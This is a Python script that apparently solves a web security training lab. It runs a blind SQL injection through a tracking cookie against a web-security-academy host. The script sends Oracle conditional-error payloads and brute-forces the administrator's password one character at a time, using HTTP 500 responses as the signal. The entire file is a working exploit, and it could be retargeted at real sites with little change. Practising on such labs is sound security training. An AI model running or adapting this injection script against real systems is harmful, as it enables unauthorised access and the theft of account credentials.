import urllib3
import urllib
import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://acd41f9d1e66adebc01a0165009c00a2.web-security-academy.net/"
password = ""
charList = list(range(48,58)) + list(range(97,123)) # 0-9, a-z
# myProxies = {'http': 'http://172.25.80.1:8080', 'https': 'https://172.25.80.1:8080'}

print("Bruteforcing the password...")

for i in range(1,21):
    for j in charList:
        char = chr(j)
        sys.stdout.write('\r' + char)
        sys.stdout.flush()
        payload = f"' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{char}') THEN to_char(1/0) ELSE 'a' END FROM DUAL)='a"
        payloadEncoded = urllib.parse.quote(payload)
        pageCookies = {'TrackingId': 'w9LJhh5foky5aoFWxyz' + payloadEncoded, 'session': '6a3SW5Masfd81pojbCYOvVxvgCsVfgkg'}
        req = requests.get(url, cookies=pageCookies, verify=False)
        if req.status_code == 500:
            password += char
            print(f" #{i} character found!")
            break

print(f"The password is: {password}")